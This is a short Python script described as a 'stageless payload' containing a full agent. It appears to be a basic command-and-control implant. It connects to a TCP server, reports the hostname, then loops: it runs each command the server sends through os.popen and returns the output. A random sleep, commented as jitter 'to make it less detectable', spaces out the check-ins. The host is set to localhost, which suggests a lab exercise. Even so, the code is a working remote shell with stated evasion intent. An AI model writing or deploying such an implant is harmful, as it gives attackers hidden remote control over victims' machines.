import socket
import time
import os, sys
import random

# Stageless Payload (contains full Agent)

HOST, PORT = "localhost", 9999
command = "hostname"
data = os.popen(command).read()
Loop = True

while(Loop):

    # Create a socket (SOCK_STREAM means a TCP socket)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        # Connect to server and send data
        sock.connect((HOST, PORT))
        sock.sendall(bytes(data + "\n", "utf-8"))

        # Receive data from the server and shut down
        received = str(sock.recv(2048), "utf-8")

        if received == "exit":
            Loop = False

        c2command = os.popen(received).read()
        sock.sendall(bytes(c2command + "\n", "utf-8"))

        # Add jitter to make it less detectable
        time.sleep(random.randint(1,5))

